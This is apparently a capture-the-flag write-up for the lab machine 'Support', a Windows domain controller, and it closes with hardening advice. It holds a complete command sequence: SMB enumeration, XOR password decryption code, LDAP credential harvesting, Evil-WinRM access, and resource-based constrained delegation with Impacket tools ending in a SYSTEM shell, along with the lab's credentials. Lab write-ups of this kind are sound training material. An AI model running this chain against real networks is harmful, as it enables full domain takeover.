# Support-HTB-Solution

Markdown

## 🗺️ Network Topology & Target Profiles
* **Target IP:** `10.129.230.181`
* **Domain Name:** `support.htb`
* **NetBIOS Name:** `DC`
* **Operating System:** Windows Server 2022 Core (Domain Controller)

---

## 🔍 Phase 1: Reconnaissance & Infrastructure Enumeration

### 1. Robust Port Scanning (Nmap)
A full TCP port scan was executed to map the attack surface exposed by the target:

```bash
nmap -sTCV -p- --min-rate 5000 -Pn 10.129.230.181 -oN nmap_full.txt

Critical Identified Ports:

    53/tcp (DNS): Domain name server.

    88/tcp (Kerberos): Key Distribution Center (KDC).

    135, 593/tcp (MSRPC): Windows RPC endpoint mapper.

    389, 3268/tcp (LDAP): Global catalog of the directory.

    445/tcp (SMB): Network file sharing.

    5985/tcp (WinRM): Windows Remote Management protocol (HTTP).

2. SMB Share Hunting

An automated inspection of network shares accessible via anonymous authentication (null session) was conducted using netexec:
Bash

netexec smb 10.129.230.181 -u '' -p '' --shares

The output revealed read access (READ) on a non-standard network share named \\10.129.230.181\support-tools.

Connecting to the share using smbclient:
Bash

smbclient //10.129.230.181/support-tools -N

A compiled binary executable named UserInfo.exe was identified and downloaded.
💻 Phase 2: Reverse Engineering & Initial Information Gathering
1. Static Analysis with a .NET Decompiler

By processing UserInfo.exe with a decompiler such as dnSpy or ILSpy, it was confirmed that the software was developed in C# (.NET). Auditing the UserInfo.Services.Protected namespace exposed a decryption routine designed to protect the LDAP connection credential:
C#

namespace UserInfo.Services;

internal class Protected
{
    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
    private static byte[] key = Encoding.ASCII.GetBytes("armando");

    public static string getPassword()
    {
        byte[] array = Convert.FromBase64String(enc_password);
        byte[] array2 = array;
        for (int i = 0; i < array.Length; i++)
        {
            array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
        }
        return Encoding.Default.GetString(array2);
    }
}

2. Replicating the Decryption Algorithm (XOR Decryption)

The developer implemented a custom obfuscation routine combining:

    An initial Base64 decoding step.

    A Cyclic XOR logical operation based on the byte array of the string "armando".

    A Fixed XOR operation utilizing the hexadecimal mask 0xDF (223 in decimal).

To quickly decrypt the string into plaintext, the algorithm was adapted into an online compiler (DotNetFiddle) to force the execution and print the key:
C#

using System;
using System.Text;

public class Program {
    public static void Main() {
        string enc = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
        byte[] key = Encoding.ASCII.GetBytes("armando");
        byte[] array = Convert.FromBase64String(enc);
        for (int i = 0; i < array.Length; i++) {
            array[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
        }
        Console.WriteLine("Decrypted Key: " + Encoding.Default.GetString(array));
    }
}

Script Result: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
3. Target Account Identification in Source Code

Auditing the LdapQuery() method within the same executable revealed that the hardcoded credentials did not belong to a generic account, but rather to a specific domain service account: support\ldap:
C#

entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);

🔍 Phase 3: Active Directory Interrogation & Initial Foothold
1. Credential Validation

The validity of the service account was verified against the SMB service using netexec:
Bash

netexec smb support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'

The output returned a green [+], confirming that the credentials were valid but the account lacked direct local administrative privileges.
2. LDAP Tree Data Harvesting

Because anonymous LDAP queries were disabled by default on the Domain Controller, the newly acquired valid session (ldap) was used to perform an Authenticated Bind to dump all real human user accounts (person):
Bash

ldapsearch -x -H ldap://support.htb -D "support\\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(&(objectClass=user)(objectCategory=person))" > detailed_users.txt

When auditing the generated file using grep to isolate account descriptions, a critical security anomaly was found within the support user object:
Bash

grep -E "sAMAccountName:|description:" detailed_users.txt

Detected Output:
Plaintext

sAMAccountName: support
description: Ironside47pleasure40Watchful

The domain administrator had mistakenly stored the production password of the primary user account directly inside the publicly readable description attribute.
3. Initial Access via WinRM

The newly discovered corporate credential was validated against the Windows Remote Management service (WinRM - port 5985):
Bash

netexec winrm support.htb -u 'support' -p 'Ironside47pleasure40Watchful'

Upon confirming valid remote execution rights, an interactive session was established using the Evil-WinRM client:
Bash

evil-winrm -i 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful'

Foothold successfully established. The initial user flag was retrieved:
PowerShell

*Evil-WinRM* PS C:\Users\support\Desktop> cat user.txt

👑 Phase 4: Privilege Escalation (Resource-Based Constrained Delegation)
1. Domain Object Audit & BloodHound Extraction

Inside the host, running whoami /priv showed standard logical privileges, but auditing group memberships revealed that the user belonged to a non-standard domain security group: SUPPORT\Shared Support Accounts.

To comprehensively map the Access Control Lists (ACLs) and trust relationships of this group, the BloodHound Python ingestor was executed using the LDAP account:
Bash

bloodhound-python -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb --nameserver 10.129.230.181 -c ALL --zip -op support.htb

Analyzing the extracted Active Directory objects mapped by BloodHound confirmed a critical structural vulnerability: The Shared Support Accounts group (of which the support user is the only active member) possesses absolute control rights (GenericAll / WriteProperty) directly over the computer object of the primary Domain Controller (DC$).
2. Theoretical Breakdown of RBCD

By having GenericAll over the DC$ object, an attacker can manipulate the Active Directory attribute known as msDS-AllowedToActOnBehalfOfOtherIdentity on the Domain Controller.

The attack flow involves registering an attacker-controlled machine account into the Active Directory and subsequently injecting its SID into that specific attribute of the DC. This forces the Domain Controller to accept Kerberos service ticket requests generated by our fake machine, allowing us to impersonate any entity in the domain (including the local Administrator) using the Kerberos extensions S4U2self and S4U2proxy.
3. Technical Exploitation (Impacket Chain)
Step A: Registering a Fake Machine Account

Taking advantage of the default right granted by SeMachineAccountPrivilege, a new legitimate computer object (PCFALSA$) was added to the directory:
Bash

impacket-addcomputer -dc-ip 10.129.230.181 support.htb/support:'Ironside47pleasure40Watchful' -computer-name 'PCFALSA' -computer-pass 'PasswordLoco123!'

Step B: Configuring the Delegation Bridge (RBCD Write)

The logical attributes of the Active Directory were modified to instruct the Domain Controller (DC$) to fully trust delegated authentication requests originating from PCFALSA$:
Bash

impacket-rbcd -action write -delegate-to 'DC$' -delegate-from 'PCFALSA$' -dc-ip 10.129.230.181 support.htb/support:'Ironside47pleasure40Watchful'

Step C: Abusing Kerberos Extensions to Impersonate the Administrator

A valid Service Ticket (ST) was requested for the SMB network resource (cifs/dc.support.htb) while masquerading as the administrator user:
Bash

impacket-getST -spn cifs/dc.support.htb -impersonate administrator -dc-ip 10.129.230.181 'support.htb/PCFALSA$:PasswordLoco123!'

The command completed successfully and stored the Kerberos ticket locally under the filename administrator.ccache.
Step D: Executing the Pass-the-Ticket Attack (System Compromise)

The rogue Kerberos ticket was exported into the current Linux terminal environment to bypass traditional password authentication prompts, and an interactive privileged shell was spawned via psexec:
Bash

export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass -dc-ip 10.129.230.181 dc.support.htb

Connection Successful. The Impacket suite terminal dropped an interactive remote shell operating under the context of the highest authority on Windows systems:
DOS

C:\Windows\system32> whoami
nt authority\system

4. Root Flag Retrieval
DOS

type C:\Users\Administrator\Desktop\root.txt

🧠 Lessons Learned & Hardening Recommendations
🚨 Remediation for Developers (Secure Coding)

    Never store hardcoded secrets: Executables built on intermediate languages (.NET/C# or Java) are trivial to reverse engineer using static decompiler tools. Service account passwords must be injected via protected environment variables or professional secret management vaults (e.g., HashiCorp Vault).

    Weak obfuscation schemas: Symmetric cyclic XOR routines do not provide real cryptographic protection or security.

🛡️ Remediation for AD Administrators (Infrastructure Hardening)

    Principle of Least Privilege (ACLs Sanity Check): Granting GenericAll or WriteProperty rights to ordinary support groups over Domain Controller objects allows a total forest compromise. These high-privilege permissions must be heavily restricted.

    Attribute Hygiene: The description field of user accounts in Active Directory is indexed and readable by any authenticated LDAP user. No secrets or temporary credentials should ever be stored in plaintext fields within the AD database.

    Control over Machine Accounts: The default value of ms-DS-MachineAccountQuota should be lowered to 0 to prevent standard users from arbitrarily registering new machine accounts in the domain for malicious purposes.
